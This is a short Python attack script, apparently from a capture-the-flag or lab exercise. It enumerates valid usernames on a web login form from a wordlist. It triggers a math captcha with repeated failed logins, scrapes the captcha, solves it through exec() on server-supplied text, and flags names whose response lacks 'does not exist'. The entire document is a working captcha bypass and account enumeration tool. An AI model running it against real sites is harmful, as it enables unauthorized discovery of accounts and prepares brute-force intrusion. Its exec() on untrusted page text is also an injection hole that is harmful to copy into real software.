#!/usr/bin/python3

import requests
import re
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--url', '-u', required=True)
parser.add_argument('--wordlist', '-w', required=True)
args = parser.parse_args()


url = args.url

user_file =  open(args.wordlist, "r")

for i in range(10):
	data = {"username":"test", "password":"test"}
	r = requests.post(url, data=data)

for i in user_file:

	user = i.split()

	captcha = re.findall("[0-9]* + .* = \?", r.text)
	exec("captcha_result =" + captcha[0][4:-4])

	data = {"username":user, "password":"test", "captcha":captcha_result}
	r = requests.post(url, data=data)

	if not "does not exist" in r.text:
		print("\033[1;32m[+] User Found!: \n" + str(user[0]))
